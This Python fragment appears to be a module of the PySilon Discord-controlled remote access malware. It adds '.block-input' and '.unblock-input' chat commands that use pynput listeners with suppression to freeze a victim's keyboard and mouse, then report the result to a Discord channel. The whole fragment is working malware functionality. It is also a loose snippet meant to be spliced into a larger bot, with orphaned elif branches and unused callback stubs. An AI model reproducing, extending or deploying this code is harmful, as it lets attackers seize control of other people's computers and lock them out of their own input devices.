from pynput import keyboard, mouse
# end of imports

# on message
elif message.content == '.block-input':
    await message.delete()

    async def on_press():
        pass

    async def on_release():
        pass

    async def on_click():
        pass

    keyboard_listener = keyboard.Listener(suppress=True)
    mouse_listener = mouse.Listener(suppress=True)

    keyboard_listener.start()
    mouse_listener.start()
    embed = discord.Embed(title="🚫 Input Blocked",description=f'```Input has been blocked. Unblock it by using .unblock-input```', colour=0x8B0000)
    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
    

    await message.channel.send(embed=embed)

elif message.content == '.unblock-input':
    await message.delete()
    keyboard_listener.stop()
    mouse_listener.stop()
    embed = discord.Embed(title="🚫 Input Unblocked",description=f'```Input has been unblocked. Block it by using .block-input```', colour=0x013220)
    embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
    embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
    

    await message.channel.send(embed=embed)